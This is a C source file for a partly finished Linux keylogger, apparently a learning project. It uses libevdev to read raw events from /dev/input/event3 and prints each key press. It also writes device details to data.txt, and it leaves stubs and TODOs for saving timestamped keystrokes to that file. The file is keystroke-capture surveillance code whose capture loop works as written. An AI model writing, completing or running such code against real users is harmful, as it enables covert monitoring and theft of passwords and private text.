/**
 * Local keylogging
 */

#include "keylogger.h"

// for keylogging
#define _POSIX_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <libevdev/libevdev.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

void begin_keylogger(void) {
  // IMPLEMENTATION HERE
}

void end_keylogger(void) {
  // IMPLEMENTATION HERE
}

void log_device(key_package* key_package) {
  // open a file to write to. If it doesn't exist yet, this creates it
  FILE* data_storage = fopen("data.txt", "w");
  if (data_storage == NULL) {
    printf("Error with opening the text file!");
    exit(1);
  }

  struct libevdev* dev;
  int rc;

  // open a new device from the file descriptor and initialize
  int fd = open("/dev/input/event0", O_RDONLY | O_NONBLOCK);
  if (fd < 0) {
    printf("error opening event0 %d\n", EXIT_FAILURE);
    fprintf(stderr, "error opening file: %d %s\n", errno, strerror(errno));
    exit(0);
  }
  rc = libevdev_new_from_fd(fd, &dev);
  if (rc < 0) {
    fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
    fclose(data_storage);
    exit(0);
  }

  // Use the getter functions to gather info about the device
  printf("Device: %s | vendor: %x | product: %x\n", libevdev_get_name(dev),
         libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));

  // TODO: store this data in a struct
  

  // store data into text file
  fprintf(data_storage, "Device: %s | vendor: %x | product: %x\n",
          libevdev_get_name(dev), libevdev_get_id_vendor(dev),
          libevdev_get_id_product(dev));

  // clean up
  libevdev_free(dev);
  close(fd);
  fclose(data_storage);
}

void handle_syn_dropped(struct libevdev* dev) {
  struct input_event ev;
  int rc = LIBEVDEV_READ_STATUS_SYNC;

  while (rc == LIBEVDEV_READ_STATUS_SYNC) {
    rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_SYNC, &ev);
    if (rc < 0) {
      if (rc != -EAGAIN) fprintf(stderr, "error %d (%s)\n", -rc, strerror(-rc));
      return;
    }

    printf("State change since SYN_DROPPED for %s %s value %d\n",
           libevdev_event_type_get_name(ev.type),
           libevdev_event_code_get_name(ev.type, ev.code), ev.value);
  }
}

void log_keys(key_package* key_package) {
  // open a file to write to. If it doesn't exist yet, this creates it
  FILE* data_storage = fopen("data.txt", "w");
  if (data_storage == NULL) {
    printf("Error with opening the text file!");
    exit(1);
  }

  // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html

  // open a device, as libevdev expects a file descriptor. You should have root
  // permissions
  struct libevdev* keyboard_dev;
  int rc;

  // get keyboard inputs event file
  int keyboard_fd = open("/dev/input/event3", O_RDONLY | O_NONBLOCK);
  if (keyboard_fd < 0) {
    fprintf(stderr, "error opening event3 file: %d %s\n", errno,
            strerror(errno));
    exit(0);
  }
  rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
  if (rc < 0) {
    fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
    fclose(data_storage);
    exit(0);
  }

  printf("does keyboard have key events? (1 = yes): %d\n",
         libevdev_has_event_type(keyboard_dev, EV_KEY));

  while (1) {
    struct input_event ev;

    // other options: LIBEVDEV_READ_FLAG_NORMAL
    rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
    if (rc < 0) {
      // note that this section runs when no event is occurring, NOT necessarily
      // when there is an error printf("value of rc: %d\n", rc);
      if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
      // exit(0);
    } else if (rc == LIBEVDEV_READ_STATUS_SYNC) {
      printf("uhhh x2\n");
      handle_syn_dropped(keyboard_dev);
    } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
      // handle event here

      // each key press/lift generates 3 events: EV_MSC, EV_SYN, and EV_KEY
      // we only care about EV_KEY, represented by ev.type == 1
      if (ev.type == 1) {
        if (ev.value == 1 || ev.value == 2) {
          printf("Key pressed!\n%d (%s) %d (%s) value %d\n",
                ev.type,
                libevdev_event_type_get_name(ev.type),
                ev.code,
                libevdev_event_code_get_name(ev.type, ev.code), 
                ev.value);
          
          // TODO: get current time here

          // TODO: make key struct, add to key package. do the file writing in another file
          // key_info pressed_key = {
          //   .key = libevdev_event_code_get_name(ev.type, ev.code),
          //   .timestamp = "uh"
          // };

          // TODO: append to key_package->keys
        }
        // else {
        //   printf("Key unpressed!\n%d (%s) %d (%s) value %d\n",
        //         ev.type,
        //         libevdev_event_type_get_name(ev.type),
        //         ev.code,
        //         libevdev_event_code_get_name(ev.type, ev.code), 
        //         ev.value);
        // }
      }

      // write to text file
      // fprintf(data_storage, "Event: %d (%s) %d (%s) value: %d\n", ev.type,
      //         libevdev_event_type_get_name(ev.type), ev.code,
      //         libevdev_event_code_get_name(ev.type, ev.code), ev.value);
    } else {
      printf("unsure of what is going on here..\n");
    }

    // TODO: change this. instead of writing to the file upon exiting
    // upon pressing "c" (represented by code 46), it should write to the
    // file every few seconds.
    if (ev.code == 46) {
      printf("exiting\n");
      exit(1);
    }
  }

  // Clean up
  libevdev_free(keyboard_dev);
  close(keyboard_fd);
  fclose(data_storage);
}

int main(void) {
  key_package key_package;
  log_device(&key_package);
  log_keys(&key_package);

  // time_t rawtime;
  // struct tm * timeinfo;

  // time ( &rawtime );
  // timeinfo = localtime ( &rawtime );
  // printf ( "Current local time and date: %s", asctime (timeinfo) );

  return 0;
}
